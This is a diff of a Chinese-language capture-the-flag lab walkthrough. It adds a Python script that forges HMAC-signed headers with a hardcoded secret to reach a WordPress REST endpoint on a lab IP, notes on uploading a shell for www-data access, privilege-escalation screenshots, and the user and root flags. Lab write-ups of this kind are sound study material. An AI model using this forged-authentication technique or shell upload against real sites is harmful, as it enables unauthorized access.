@@ -175,12 +175,106 @@ print(response.text)
 >
 
 
+>又能继续了
+>
+
+```
+import requests
+import hmac
+import time
+
+url = "http://192.168.137.131/wordpress/wp-json/wp/v2/archive/"
+timestamp = str(int(time.time()))
+nonce = "mahalkita"
+secret = "supersecret".encode('utf-8')  # 密钥编码为字节
+
+# 生成 HMAC-SHA256 签名
+message = f"{timestamp}{nonce}".encode('utf-8')
+signature = hmac.new(secret, message, digestmod='sha256').hexdigest()
+
+headers = {
+    "timestamp": timestamp,
+    "nonce": nonce,
+    "signature": signature
+}
+
+response = requests.get(url, headers=headers)
+print("HTTP Status Code:", response.status_code)
+print("Response Body:", response.text)
+```
+
+>这是脚本
+>
+
+![picture 21](../assets/images/b328a4e159ef100a783a63fa7713cb57ec31fc5ce3251924e8d3d8d116beb415.png)  
+![picture 22](../assets/images/8cc6a86f5a7f1c0be1dd6123ed9f59c357804292e4b0cb779287af1e10bf5b22.png)  
+
+>写一个过滤很丑陋，不过肯定有优雅方案
+>
+
+![picture 23](../assets/images/acf5e3875e8f16a349da7f19489703fd7e650626cbda619122646dbe2fb14264.png)  
+![picture 24](../assets/images/035c3ce5d801a7f1a2b6f213b2c5788f3af082c637b777351d169f08f3fa91eb.png)  
+![picture 25](../assets/images/d005bb203ae79fa733f424ca226f1125aa9bb09334b329ad4499b66a83e6ed27.png) 
+![picture 27](../assets/images/f808f8335d603d883f66c167c2bb5d2aa3aac6b52327ecd2d0b56203d7aae6e6.png)  
+
+![picture 26](../assets/images/4551d18e73b5266cd3efeac84013707d8f8c20c4f469636e2fa06dece368b800.png)  
+
+![picture 28](../assets/images/5ad90c793d5ddf84fa79b2ceb40fec28de7d3c993bb38df87654a75b1228eee4.png)  
+
+>后面方案是大佬的比我写的优雅，放出来研究
+>
+
+![picture 29](../assets/images/af22f38a2120b065d230b90f593450a8bb6d43c595a024b85f3079457bf5b245.png)  
+
+>上传个sh大概了，这是我目前知道对应smb的操作
+>
+
+![picture 30](../assets/images/7503641b45d33415c743e554656463dbee94c8268890be2e5e29b997273a94e0.png)  
+
+>上传个文件能拿到www-data的用户
+>
+
+![picture 31](../assets/images/6ab3c7f9d13edbccaf7cd27ad6cbdad664ed44ecc1f347619bace2b518dbb311.png)  
+![picture 33](../assets/images/2a2047069d925c99f0e0e700d7bc4e07197f982dc23160e69e01b5522ef2b0c8.png)  
+
+![picture 32](../assets/images/e0047492cfa04b20612680d4ac9f3efae7a5133b9804d5cdcb3741dedd0fc919.png)  
+![picture 34](../assets/images/ad73b0a3000aaddf60d432a5827d971e410c20f76f13ad4b0d429967f3b2e61a.png)  
+
+>有点奇怪好牛马,这个格式没调出来，一开始我以为是我电脑问题，重新开端口也不行
+>
+
+![picture 35](../assets/images/ca6ebdd6654623f30581aebd3856fbd22dd430daf187a9a5a4d7394e90ba1661.png)  
+
+>我还是没找到对应的wordpress密码
+>
 
 ## 提权
+![picture 36](../assets/images/83c721f441ddcc179a2678ee0636457eecb522ac73667e38551d8223c7847e92.png)  
+![picture 37](../assets/images/ee7e56dc948d3dca120ff0b4d0ab787e771966020463a476c046569ff4c0c929.png)  
+![picture 38](../assets/images/c3d54b9bdb2d47e24197e0ff32836be31474461c914b1dfb82127fbda74e3000.png)  
+![picture 39](../assets/images/89fdf8721f1c47e48bb5926a6236bd652e3ea4d3df40d140ec50c6a3ad4d489a.png)  
+![picture 40](../assets/images/3316fb4008af37b468b06018fe5de07585393d4e44ae8784eb5428b4743b47ce.png)  
+![picture 41](../assets/images/6b2e08edd10a4e8fff7b5168e71f59ad7a2c58f9969d277184326c83f867151a.png)  
 
-
-
->userflag:
+>终于调好终端，不过呢先不直接提权因为现在直接提权没意思了，我看看咋拿wordpress的账户密码
 >
->rootflag:
+
+![picture 42](../assets/images/e833b3c9cdae4d92b04e0898f34278f631d651e3c700ad42dda3773563451a62.png)  
+![picture 43](../assets/images/9757959a0ede1653ec3f06a07696c027d272e6aff10ca95b4895a4807b8ccd59.png)  
+![picture 44](../assets/images/416d93bb7b4c85745bc88b0e0c14ee6d0feba77e4bdbba22972b6f095823bdaa.png)  
+![picture 45](../assets/images/ea97381be029bba507f0e0bc2ba5092fc0191babb1d7a3e5c2ebbffc7253d83a.png)  
+
+>直接写一个就好了
+>
+
+![picture 46](../assets/images/3b7fbdab8a1a76ba568d8bd485daff8924b2abc4fe879260597af65a93fec87a.png)  
+
+>算了就这样了这个靶机其实也就前面的地方有难度
+>
+
+
+
+>userflag:647cb9f7681a16e4d624292af30ac0cf
+>
+>rootflag:ece9596c8b1cff09b05ececadc0bc5b4
 >
